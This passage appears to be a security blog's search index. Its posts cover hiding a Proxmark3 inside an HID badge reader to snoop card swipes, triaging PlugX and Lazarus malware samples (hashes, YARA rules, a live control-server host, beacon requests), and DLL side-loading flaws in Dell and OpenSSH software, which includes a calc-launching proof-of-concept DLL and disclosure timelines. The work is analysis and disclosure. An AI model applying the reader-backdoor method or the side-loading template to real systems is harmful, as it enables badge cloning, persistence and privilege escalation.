Arduino, which makes it ideal for some testing.</p><p>HID Prox Pro IIWhile exploring the device, I was disappointed that the actual components of the device (except the antenna) were sealed under some type of resin coating. Despite the components being inaccessible, I noticed there was a lot of available space inside…Big enough to fit an entire Proxmark3. So — theoretically, it may be possible to install a device inside this empty space that could capture tag data whenever someone swipes.</p><p>Interior of HID reader</p><p>Proxmark3 sitting insideFeedback from folks on Twitter noted the potential for interference between the two devices — which makes sense, if the HID card reader is emitting a signal to power a card, a second device in close proximity could cause a problem.</p><p>From the famous Iceman himselfThe argument is sound, I’d previously experimented with an Anti-NFC card from CN360’s Unicorn team, which emits a signal to jam communication between a reader and a tag.</p><p>A possible way to get around this came from NotMedic and iceman was to possibly wire the Proxmark to the device’s physical antenna.From looking at the inside of the HID device, it wouldn’t be terribly hard to solder a lead to the exposed antenna connection — using an alligator clip may be faster.</p><p>Antenna connectionHowever, I wasn’t feeling bold enough to go that route, and opted to use the stock antenna and test things out. From the Proxmark client, I was able to verify readability of my testing tag/card.proxmark3&gt; lf searchNOTE: some demods output possible binary  if it finds something that looks like a tag        <br />False Positives ARE possibleChecking for known tags:</p><h2 id="hid-prox-tag-id-2e6277a2df">HID Prox TAG ID: 2e6277a2df<a class="headerlink" href="#hid-prox-tag-id-2e6277a2df" title="Permanent link"></a></h2><div class="codehilite"><pre>   Format: C1k35s (HID Corporate 1000 35-bit standard layout)</pre></div><p>Facility Code: 787        <br />  Card Number: 774511        <br />       Parity: Valid          </p><hr /><p>Valid HID Prox ID Found!Using lf snoop, the device will eavesdrop in on the tag reads from the HID reader:proxmark3&gt; lf snoopproxmark3&gt; data sampleReading 39999 bytes from device memoryData fetchedSamples @ 8 bits/smpl, decimation 1:1proxmark3&gt; data plot</p><p>PlottedPracticalityWhile a nifty trick there are some practicalities that make conducting this a challenge:Tamper sensors — as mdhardeman pointed out many HID readers have either optical or switch based tamper sensors to alert if someone attempts this.Space &amp; Power— While Proxmark fits, I needed to run a USB cable out the back for power/comms, which was tricky. Use in the field may be better using something like a ESP-RFID-Tool, as pointed out by jermainlaforce. Despite the ESP-RFID-Tool having a smaller footprint, it uses wifi — which unless carefully planned, could lead to having to physically be close to the backdoored HID reader.</p><p>(Post migrated from Medium - <a href="https://medium.com/emptyregisters/backdooring-a-hid-reader-22a9cc9bd92b">https://medium.com/emptyregisters/backdooring-a-hid-reader-22a9cc9bd92b</a> )</p></article></body></html>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Backdooring a HID Reader</title>
      <link href="2020/11/03/Backdooring-a-HID-Reader/"/>
      <url>2020/11/03/Backdooring-a-HID-Reader/</url>
      
        <content type="html"><![CDATA[<p>A while back, I bought a <a href="https://www.hidglobal.com/products/readers/hid-proximity/5455">HID Prox Pro II</a> on eBay for some long-forgotten experiment — likely <a href="https://hackaday.com/2013/11/03/rfid-reader-snoops-cards-from-3-feet-away/">this</a>. Outside of being <a href="https://www.hidglobal.com/doclib/files/resource_files/5355a-900-n.3-proxpro-wiegnad-clock-and-data-install-guide-en.pdf">well documented</a> and <a href="https://www.ebay.com/sch/i.html?_from=R40&_nkw=HID+Prox+Pro+reader&_sacat=0&LH_TitleDesc=0&_sop=15">cheaply available</a>, @shakataganai wrote a fantastic <a href="https://obviate.io/2016/11/23/connecting-a-hid-prox-pro-ii-rfid-reader-to-arduino/">article</a> about how to connect it to an Arduino, which makes it ideal for some testing.</p><p><img src="/uploads/0*bHzHy2sHYVywzMZM.jpg" alt="HID Prox Pro II"></p><p>While exploring the device, I was disappointed that the actual components of the device (except the antenna) were sealed under some type of resin coating. Despite the components being inaccessible, I noticed there was a lot of available space inside…Big enough to fit an entire <a href="https://github.com/Proxmark/proxmark3">Proxmark3</a>. So — theoretically, it <a href="https://twitter.com/silascutler/status/1133723910413934592">may</a> be possible to install a device inside this empty space that could capture tag data whenever someone swipes.</p><p><img src="/uploads/1*AmxtYvKBO0nUKCcV3tIviQ.png" alt="Interior of HID reader"></p><p><img src="/uploads/1*kYxp2um0YDmjI3D_dSQsBg.png" alt="Proxmark3 sitting inside"></p><p>Feedback from folks on Twitter noted the potential for interference between the two devices — which makes sense, if the HID card reader is emitting a signal to power a card, a second device in close proximity could cause a problem.</p><p><img src="/uploads/1*tGuHUxsiGSce_kWV_VH_HA.png" alt="Reply from Iceman"></p><p>The argument is sound, I’d previously experimented with an <a href="https://itw01.com/QFUJAEK.html">Anti-NFC</a> card from CN360’s Unicorn team, which <a href="https://twitter.com/silascutler/status/912448923310149632">emits a signal to jam communication</a> between a <a href="https://twitter.com/silascutler/status/912445743008555009">reader and a tag</a>.</p><p><img src="/uploads/1*AwSHdI2odYiNHhYrZ_zaqA.png"></p><p>A possible way to get around this came from <a href="https://twitter.com/NotMedic">NotMedic</a> and <a href="https://twitter.com/herrmann1001">iceman</a> was to possibly wire the Proxmark to the device’s physical antenna.<br>From looking at the inside of the HID device, it wouldn’t be terribly hard to solder a lead to the exposed antenna connection — using an alligator clip may be faster.</p><p><img src="/uploads/1*E9BdKzeuubHe987xBCMRPg.png" alt="Antenna connection"></p><p>However, I wasn’t feeling bold enough to go that route, and opted to use the stock antenna and test things out. From the Proxmark client, I was able to verify readability of my testing tag/card.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">proxmark3&gt; lf search</span><br><span class="line">NOTE: some demods output possible binary</span><br><span class="line">  if it finds something that looks like a tag          </span><br><span class="line">False Positives ARE possible</span><br><span class="line">Checking for known tags:</span><br><span class="line">          </span><br><span class="line">HID Prox TAG ID: 2e6277a2df          </span><br><span class="line">--------------------------------------------------          </span><br><span class="line">       Format: C1k35s (HID Corporate 1000 35-bit standard layout)          </span><br><span class="line">Facility Code: 787          </span><br><span class="line">  Card Number: 774511          </span><br><span class="line">       Parity: Valid          </span><br><span class="line">--------------------------------------------------</span><br><span class="line">Valid HID Prox ID Found!</span><br><span class="line">Using lf snoop, the device will eavesdrop in on the tag reads from the HID reader:</span><br><span class="line">proxmark3&gt; lf snoop</span><br><span class="line">proxmark3&gt; data sample</span><br><span class="line">Reading 39999 bytes from device memory</span><br><span class="line">Data fetched</span><br><span class="line">Samples @ 8 bits&#x2F;smpl, decimation 1:1</span><br><span class="line">proxmark3&gt; data plot</span><br></pre></td></tr></table></figure><p><img src="/uploads/1*N-ixJQaLMhVLrf4KgQzzwQ.png" alt="Plotted"></p><h3 id="Practicality"><a href="#Practicality" class="headerlink" title="Practicality"></a>Practicality</h3><p>While a nifty trick there are some practicalities that make conducting this a challenge:<br>Tamper sensors — as <a href="https://twitter.com/mdhardeman/status/1133759460487454721">mdhardeman pointed out</a> many HID readers have either optical or switch based tamper sensors to alert if someone attempts this.<br>Space &amp; Power— While Proxmark fits, I needed to run a USB cable out the back for power/comms, which was tricky. Use in the field may be better using something like a <a href="https://github.com/rfidtool/ESP-RFID-Tool">ESP-RFID-Tool</a>, as pointed out by <a href="https://twitter.com/jermainlaforce">jermainlaforce</a>. Despite the <a href="https://github.com/rfidtool/ESP-RFID-Tool">ESP-RFID-Tool</a> having a smaller footprint, it uses wifi — which unless carefully planned, could lead to having to physically be close to the backdoored HID reader.</p><p>(Post migrated from Medium - <a href="https://medium.com/emptyregisters/backdooring-a-hid-reader-22a9cc9bd92b">https://medium.com/emptyregisters/backdooring-a-hid-reader-22a9cc9bd92b</a> )</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Fresh PlugX October 2019</title>
      <link href="2020/11/03/Fresh-PlugX-October-2019/"/>
      <url>2020/11/03/Fresh-PlugX-October-2019/</url>
      
        <content type="html"><![CDATA[<p>On 15 November 2019, I received a VirusTotal notification for a copy of PlugX that had been uploaded ( Yara - <code>PlugXBootLDRCode</code> from <a href="https://github.com/citizenlab/malware-signatures/blob/master/malware-families/plugx.yara">https://github.com/citizenlab/malware-signatures/blob/master/malware-families/plugx.yara</a> ).</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">MD5          : ce67994a4ee7cf90645e93aec084230d</span><br><span class="line">SHA1         : b42c84f851b8b7d2d2ddfbc9ac94e001204faf45</span><br><span class="line">SHA256       : 6b46e36245b5b9ed13c0fbfae730b49c04aba43b98deb75e388e03695ff5cbd1</span><br><span class="line">Type         : Win32 DLL</span><br><span class="line"></span><br><span class="line">First seen   : 2019-11-15 08:04:32 UTC</span><br><span class="line">Last seen    : 2019-11-15 08:04:32 UTC&amp;nbsp</span><br><span class="line"></span><br><span class="line">First name   : plugx.dll </span><br></pre></td></tr></table></figure><p>What stood out from the notification (outside of the file being named <code>plugx.dll</code>) was a compilation time of <code>Fri Oct 4 08:34:45 2019 UTC</code> (a little more then a month before the writing of this post).</p><h2 id="Initial-Validation"><a href="#Initial-Validation" class="headerlink" title="Initial Validation"></a>Initial Validation</h2><p>This specific rule matches on operations for assembling a set of API calls - shown below</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ yara -s All.yara sample</span><br><span class="line">PlugXBootLDRCode [PlugX,Family] 6b46e36245b5b9ed13c0fbfae730b49c04aba43b98deb75e388e03695ff5cbd1</span><br><span class="line">0x7708:$GetProcAdd: 80 38 47 75 36 80 78 01 65 75 30 80 78 02 74 75 2A 80 78 03 50</span><br><span class="line">0x7786:$L4_LoadLibraryA: C7 85 5C FF FF FF 4C 6F 61 64 C7 85 60 FF FF FF 4C 69 62</span><br><span class="line">0x7859:$L4_ExitThread: C7 85 FC FE FF FF 45 78 69 74 C7 85 00 FF FF FF 54 68 72 65</span><br></pre></td></tr></table></figure><p><img src="/uploads/Screenshot+at+2019-11-16+21-56-04.png" alt="Screenshot of match condition in IDA"></p><p><em>As a general note, the <code>-s</code> flag in Yara is used for outputting the matched strings and is extremely useful for debugging rules and evaluating why a file matched.</em></p><p>From a quick comparison of the strings, a quick Google search found previous reporting confirming this file was PlugX (ref: <a href="http://takahiroharuyama.github.io/blog/2014/03/27/id-slash-idapython-scripts-extracting-plugx-configs/">http://takahiroharuyama.github.io/blog/2014/03/27/id-slash-idapython-scripts-extracting-plugx-configs/</a>)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">DEMO...</span><br><span class="line">THIS IS A DEMO VERSION!!!</span><br><span class="line">\\.\PIPE\RUN_AS_USER(%d)</span><br><span class="line">%WINDIR%\SYSTEM32\SERVICES.EXE</span><br><span class="line">Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">System\CurrentControlSet\Services</span><br><span class="line">debug.hlp</span><br><span class="line">C:\Windows\System32\rundll32.exe &quot;%s&quot; BypassUAC %s</span><br><span class="line">PI[%8.8X]</span><br><span class="line">%s\%d.plg</span><br><span class="line">mytilus3.hlp</span><br><span class="line"></span><br><span class="line">%04d-%02d-%02d %02d:%02d:%02d</span><br></pre></td></tr></table></figure><h2 id="Overlaps-with-versions"><a href="#Overlaps-with-versions" class="headerlink" title="Overlaps with versions"></a>Overlaps with versions</h2><p>A outstanding point of reference evaluating PlugX is the Sophos report (<a href="https://www.sophos.com/en-us/medialibrary/pdfs/technical%20papers/plugx-thenextgeneration.pdf">https://www.sophos.com/en-us/medialibrary/pdfs/technical%20papers/plugx-thenextgeneration.pdf</a>).  On Page 7, Gabor Szappanos has a table covering the supported commands.  In this copy, <code>sub_10008DE</code> acts as a command handler for evaluating operator commands and can be used to evaluate this copy against that from 2014:</p><p><img src="/uploads/Screenshot+at+2019-11-16+21-50-14.png"></p><p>In the above screenshot, many of the commands from the 2014 version are present; some additional commands are present, however, handled withing sub-functions of <code>sub_10008DE</code>.</p><p>What did appear unique was a set of commands for monitor clipboard activity:</p><p><img src="/uploads/Screenshot+at+2019-11-16+22-25-08.png"></p><p>An initial Google search did not show any hits for these being previously documented commands in PlugX - suggesting it may be a new feature - however, further analysis is needed to validate this.</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Lazarus obfuscation in Feb 2019</title>
      <link href="2020/11/03/Lazarus-obfuscation-in-Feb-2019/"/>
      <url>2020/11/03/Lazarus-obfuscation-in-Feb-2019/</url>
      
        <content type="html"><![CDATA[<p>Lazarus obfuscation in Feb 2019</p><p>Starting off, I’d like to give a shot-out to Brian Bartholomew (Twitter: @Mao_Ware) for his general awesomeness and for his post on 30 January from which this research starts.</p><p><img src="/uploads/Screenshot+at+2019-09-23+09-13-46.png"></p><p>Using this as a base for the following Yara rule, I found a similar sample (SHA256: <code>625f63364312cec78a4c91abedba868d551d79185ff73e388f561017b13347f0</code>) also packed with UPX.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">rule LazarusDocJan2019_01</span><br><span class="line">&#123;</span><br><span class="line">  meta:</span><br><span class="line">    author &#x3D; &quot;Silas Cutler&quot;</span><br><span class="line">    description &#x3D; &quot;Detection for Lazarus Payload from Jan 2019&quot;</span><br><span class="line">    ref &#x3D; &quot;https:&#x2F;&#x2F;twitter.com&#x2F;DrunkBinary&#x2F;status&#x2F;1090625122883510274&quot;</span><br><span class="line">    version &#x3D; &quot;0.1&quot;</span><br><span class="line">   strings:</span><br><span class="line">     $ &#x3D; &quot;\&quot;Main Invoked.\&quot;&quot;</span><br><span class="line">     $ &#x3D; &quot;\&quot;Main Returned.\&quot;&quot;</span><br><span class="line">     $ &#x3D; &quot;%sd.%se%sc %s &gt; %s 2&gt;&amp;1&quot;</span><br><span class="line">   condition:</span><br><span class="line">     all of them</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>As with the sample Brian identified, the control server is not obfuscated in the binary:</p><p><img src="/uploads/1*wnzxT8mNHyMNvTx3gudlSQ.png" alt="Control server in `WinMain` function"></p><p>Sandboxing of the sample, confirms the malware beacons to this URL:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;intro&#x2F;info&#x2F;info.asp?id&#x3D;dn678 HTTP&#x2F;1.1.</span><br><span class="line">Accept: *&#x2F;*.</span><br><span class="line">Accept-Encoding: gzip, deflate.</span><br><span class="line">User-Agent: Mozilla&#x2F;4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident&#x2F;7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E).</span><br><span class="line">Host: poem.ekosa.org.</span><br><span class="line">Connection: Keep-Alive.</span><br></pre></td></tr></table></figure><p>In IDA, we can see the malware uses the standard <code>LoadLibrary</code> / <code>GetProcessAddress</code> method for dynamically loading some key function calls. Shown below, the encoded string <code>y8zS2vHp8PLx//rK8dj38vvf</code> is base64 decoded and XORed by <code>0x9E</code>, resulting in the string <code>URLDownloadToFileA</code> that is passed to <code>GetProcAddress</code>.</p><p>The data returned by the control server is decoded using the same method as the <code>URLDownloadToFileA</code> (shown below).</p><p><img src="/uploads/1*2Uo3vIWWLhc2M2Xb3bCxew.png"></p><p>The decoded contents are written to disk for execution, unless the response starts with <code>sleep</code>, which will cause the sample to pause for <code>60000ms</code>, before retrying the request.</p><p>Sandboxing also showed the sample made several other HTTP calls to the same URL with the parameter string search=2tjbpK6urq6urq6u.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;intro&#x2F;info&#x2F;info.asp?search&#x3D;2tjbpK6urq6urq6u HTTP&#x2F;1.1.</span><br><span class="line">Accept: *&#x2F;*.</span><br><span class="line">Accept-Encoding: gzip, deflate.</span><br><span class="line">User-Agent: Mozilla&#x2F;4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident&#x2F;7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E).</span><br><span class="line">Host: poem.ekosa.org.</span><br><span class="line">Connection: Keep-Alive.</span><br></pre></td></tr></table></figure><p>In IDA, we can see that the <code>?search=</code> is concatenated to end of the URL along with a value that is XOR-encoded using a key of 0x9E and then base64 encoded, shown below.</p><p><img src="/uploads/1*yTg2BRkURLXEpnbqWiFCag.png" alt="indata is XOR encoded using 0x9E and then base64-ed"></p><p>Knowing the obfuscation is trivial, in a few lines of Python — the value being sent was <code>DFE:00000000</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Python 2.7.15rc1 (default, Nov 12 2018, 14:31:15) </span><br><span class="line">&gt;&gt;&gt; indata &#x3D; &quot;2tjbpK6urq6urq6u&quot;</span><br><span class="line">&gt;&gt;&gt; out &#x3D; &quot;&quot;</span><br><span class="line">&gt;&gt;&gt; for byte in indata.decode(&#39;base64&#39;):</span><br><span class="line">...  out +&#x3D; chr(ord(byte) ^ 0x9E)</span><br><span class="line">... </span><br><span class="line">&gt;&gt;&gt; out</span><br><span class="line">&#39;DFE:00000000&#39;</span><br></pre></td></tr></table></figure><p>However, outside of the novel ability to decode something arbitrarily encode, this doesn’t provide any insight about functionality or purpose. Turning back to IDA, we can see the string DFE:%08x is a format string that takes an unsigned int. Looking at where this string is defined, we can see there are several similar strings.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.rdata:00417644 aIdDn678        db &#39;?id&#x3D;dn678&#39;</span><br><span class="line">.rdata:00417658 aSearch         db &#39;?search&#x3D;&#39;</span><br><span class="line">.rdata:00417664 aCfe08x         db &#39;CFE:%08x&#39;</span><br><span class="line">.rdata:00417670 aGfse08x        db &#39;GFSE:%08x&#39;</span><br><span class="line">.rdata:0041767C aLae08x         db &#39;LAE:%08x&#39;</span><br><span class="line">.rdata:00417688 aRfe08x         db &#39;RFE:%08x&#39;</span><br><span class="line">.rdata:00417780 aCpe08x         db &#39;CPE:%08x&#39; </span><br><span class="line">.rdata:0041778C aDfe08x         db &#39;DFE:%08x&#39;</span><br></pre></td></tr></table></figure><p>For each of these, the associated derived from <code>GetLastError()</code> (shown below).</p><p><img src="/uploads/1*y0QOM3r7drZeXHb15_CDKA.png"></p><p>Running through the rest of the file, the strings correlate as follows - <a href="https://gist.githubusercontent.com/silascutler/4245513e2dc1a7a9fc3d73346dd0cd12/raw/17d5bea8f80e73ca84a4ca0f36f19209c271f267/strfmt.csv">https://gist.githubusercontent.com/silascutler/4245513e2dc1a7a9fc3d73346dd0cd12/raw/17d5bea8f80e73ca84a4ca0f36f19209c271f267/strfmt.csv</a></p><p>(Post migrated from Medium - <a href="https://medium.com/emptyregisters/lazarus-downloader-brief-analy-17875f342d96">https://medium.com/emptyregisters/lazarus-downloader-brief-analy-17875f342d96</a> )</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Finding the same bugs in all the familiar places</title>
      <link href="2020/11/03/Finding-the-same-bugs-in-all-the-familiar-places/"/>
      <url>2020/11/03/Finding-the-same-bugs-in-all-the-familiar-places/</url>
      
        <content type="html"><![CDATA[<h3 id="Migrated-Post"><a href="#Migrated-Post" class="headerlink" title="(Migrated Post)"></a>(Migrated Post)</h3><p>A while back, I had a patch of cases where I was regularly looking at samples leveraging DLL Side loading (also called <code>Search Order Hijacking</code>) as part of their setup phase.  This vulnerability exists because of how Windows handles resolving libraries for applications and can be exploited to cause an application to inadvertently load (at the same privilege level) a malicious library.  When a library is<br>loaded by an application (either delayed or at execution), Windows will check the following locations<br> in order for a copy of the library:</p><p><img src="/uploads/Finding-the-same-bugs-in-all-the-familiar-places.soh.png" alt="https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order"></p><p>The above shows the locations checked when SafeDllSearchMode is disabled.  When enabled, the current directory is checked fifth, instead of second.  </p><p>This process can be exploited when a malicious library is added to one of these locations - before<br>the actual library natively resides.  For example, if <code>MyApp.exe</code> is attempting to load <code>TestLib.dll</code>,<br>which is located in SYSTEM32 (location #3 above) and an attacker deploys a malicious copy to the current working directory<br> (#2 above) - the malicious copy will be loaded, instead of the native copy.  </p><p>Exploitation of this technique in the wild has been commonly used by attackers for mainly:</p><ul><li>Initial access deployment - <em>In observed cases, a vulnerable legitimate and signed executable is bundled with a malicious<br>library and obfuscated payload inside of a Self-Extracting (SFX) RAR Archive.</em> </li><li>System persistence - <em>Attackers install a malicious library to the same folder as a vulnerable application that is<br>regularly executed or run as a system service</em></li></ul><p>Some have argued that DLL Side loading is an Antivirus (AV) vulnerability - based on the<br>assumption /  that detection engines only look at the parent process and make a determination<br>based on that.  While that may be the case for some AV products (and of those from 2005), the<br>vulnerability can be exploited for tactical uses, beyond a detection bypass.  In addition to being<br>usable for persistence, because the side loaded libraries are run at the same privilege level as<br>the associated process, if loaded by a system services, it would be possible to escalate to<br>SYSTEM level. </p><p><img src="/uploads/Finding-the-same-bugs-in-all-the-familiar-places.calc_open.png" alt="Calc.exe opened by maliciously library loaded by vulnerable application"></p><p>Following are two interesting applications I found that were vulnerable to DLL Side loading that<br>have finished the notification process and some analytical assessments of each:</p><h3 id="Dell-Power-Management-Packages"><a href="#Dell-Power-Management-Packages" class="headerlink" title="Dell Power Management Packages"></a>Dell Power Management Packages</h3><p>While rebuilding a bare-metal sandbox, I ran the Dell Power Management Service Updater ( <code>Dell-Power-Manager-Service_XJ50Y_WIN64_3.0.0_A00.EXE</code> / SHA256 Hash<br><code>62dcd3ba9a005255a651dfb601405a6258312cbcd1bdf63489f65837b212601a</code>) through<br><a href="https://github.com/Cybereason/siofra">Siofra</a> as a cursory check.  </p><p>Following is the output from this check:</p><p><img src="/uploads/Finding-the-same-bugs-in-all-the-familiar-places.sofria.png" alt="Output"></p><p>From the output, six of the dependencies of this installer were flagged as vulnerable.  Using<br>Process Monitor when the installer was executed (from <code>C:\Users\User\Desktop\</code>), the highlighted lines show the installer first attempting to open VERSION.dll from the same directory as the installer, before then moving on to SYSTEM32 - showing that the installer was highly-likely vulnerable.</p><p><img src="/uploads/Finding-the-same-bugs-in-all-the-familiar-places.procmon.png" alt="Output"></p><p>In order to confirm fully this vulnerability, a PoC malicious library was written in Visual Studio with<br> the same exports as VERSION.dll linked to the original library. The main components of this<br> are DllMain, which contains a switch statement with a WinExec call to open calc.exe<br>whenever the library is loaded (shown first), and the links to the original library exports<br> (shown second):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">BOOL APIENTRY DllMain( HMODULE hModule,</span><br><span class="line">                       DWORD  ul_reason_for_call,</span><br><span class="line">                       LPVOID lpReserved )</span><br><span class="line">&#123;</span><br><span class="line"> switch (ul_reason_for_call)</span><br><span class="line"> &#123;</span><br><span class="line">  case DLL_PROCESS_ATTACH:</span><br><span class="line">  &#123;</span><br><span class="line">   WinExec(&quot;c:\\windows\\system32\\calc.exe&quot;, SW_SHOW);</span><br><span class="line">  &#125;</span><br><span class="line">  case DLL_THREAD_ATTACH:</span><br><span class="line">  &#123;</span><br><span class="line">   WinExec(&quot;c:\\windows\\system32\\calc.exe&quot;, SW_SHOW);</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> return TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#pragma comment(linker, &quot;&#x2F;export:GetFileVersionInfoA&#x3D;C:&#x2F;Windows&#x2F;System32&#x2F;version.GetFileVersionInfoA&quot;)</span><br></pre></td></tr></table></figure><p>The result of this is a beautiful waterfall of calc when the installer is loaded:</p><p><img src="/uploads/Finding-the-same-bugs-in-all-the-familiar-places.calc_waterfall.png" alt="Output"></p><p>What makes this case interesting is that the vulnerable application is installed by default on some new Dell systems.  For an attacker, this type of vulnerability could be trivially leveraged for persistence - given the large-installation base.   </p><p>Notification Timeline:</p><table><thead><tr><th>Date</th><th>Event</th></tr></thead><tbody><tr><td>2018 May  9</td><td>Reported to Dell</td></tr><tr><td>2018 May  9</td><td>Dell acknowledge receipt</td></tr><tr><td>2018 May 15</td><td>Dell re-acknowledge receipt</td></tr><tr><td>2019 May 20</td><td>Dell provides update stating review is in final review and release coming soon</td></tr><tr><td>2019 June 3</td><td>Dell provides update that another researcher has submitted additional information related to original vulnerability</td></tr><tr><td>2019 September 1</td><td>I Requested status update</td></tr><tr><td>2019 September 4</td><td>Dell states the review is in final review and update coming next week</td></tr><tr><td>2019 September 12</td><td>Dell publishes Security Advisory (DSA-2019-065 / CVE-2019-3726)</td></tr></tbody></table><h3 id="Windows-10-OpenSSH-Client"><a href="#Windows-10-OpenSSH-Client" class="headerlink" title="Windows 10 OpenSSH Client"></a>Windows 10 OpenSSH Client</h3><p>While preparing for the 2019 Northeast Collegiate Cyber Defense Competition (NECCDC) I<br> found that several of the executable files (listed below) for OpenSSH for Windows (version <code>7.6.0.0</code>)<br>were also vulnerable to DLL Side loading, using the same method of identification with Siofra,<br>validation with ProcessMonitor and validation with a PoC.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\OpenSSH\scp.exe</span><br><span class="line">C:\Windows\System32\OpenSSH\sftp.exe</span><br><span class="line">C:\Windows\System32\OpenSSH\ssh-add.exe</span><br><span class="line">C:\Windows\System32\OpenSSH\ssh-agent.exe</span><br><span class="line">C:\Windows\System32\OpenSSH\ssh-keygen.exe</span><br><span class="line">C:\Windows\System32\OpenSSH\ssh-keyscan.exe</span><br><span class="line">C:\Windows\System32\OpenSSH\ssh.exe </span><br></pre></td></tr></table></figure><p>In each of the vulnerable executable files, the following libraries could be used for exploitation:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bcrypt.dll</span><br><span class="line">logoncli.dll</span><br><span class="line">netutils.dll</span><br><span class="line">ntmarta.dll</span><br><span class="line">samcli.dll</span><br><span class="line">SspiCli.dll</span><br><span class="line">wkscli.dll</span><br></pre></td></tr></table></figure><p>Unlike the previous case, this vulnerability is inherently interesting because of the large base of potentially vulnerable systems.  However, this vulnerability impacting OpenSSH allows for a number of theoretically possible attacks, that may not applicable to large-scale usage, but may be of high value in a targeted attack scenario.</p><p>Notification Timeline:</p><table><thead><tr><th>Date</th><th>Event</th></tr></thead><tbody><tr><td>2019 March 11</td><td>Reported to Microsoft MSRC</td></tr><tr><td>2019 March 11</td><td>Received automated acknowledgement</td></tr><tr><td>2019 March 20</td><td>Received acknowledgement report was being reviewed</td></tr><tr><td>2019 March 28</td><td>Microsoft verified the issue, however determined it does not meet their bar for servicing via a monthly security update.</td></tr></tbody></table><h4 id="Final-Thoughts"><a href="#Final-Thoughts" class="headerlink" title="Final Thoughts"></a>Final Thoughts</h4><p>As exploitation of these vulnerabilities require either existing system access or social engineering,<br>they are by no means the most critical out there.  However, I feel @n0x00 described it best in a<br>GitHub thread: “it’s the XSS of thick client work”.</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>init</title>
      <link href="2020/11/02/init/"/>
      <url>2020/11/02/init/</url>
      
        <content type="html"><![CDATA[<p>Testing / Initial Setup</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
